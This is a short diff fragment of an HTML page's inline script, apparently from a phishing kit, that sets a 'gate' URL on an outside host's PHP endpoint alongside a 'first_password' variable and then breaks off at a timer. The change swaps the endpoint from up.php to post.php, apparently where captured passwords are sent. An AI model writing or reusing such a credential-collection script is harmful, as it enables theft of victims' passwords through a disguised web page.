@@ -41,7 +41,7 @@
     </div>
     <script type="text/javascript">
         (function() {
-    var gate = 'https://boogieshack.net/extlib/XML/Parser/up.php';
+    var gate = 'https://boogieshack.net/extlib/XML/Parser/post.php';
     var first_password = '';
 
 	setTimeout(function(){
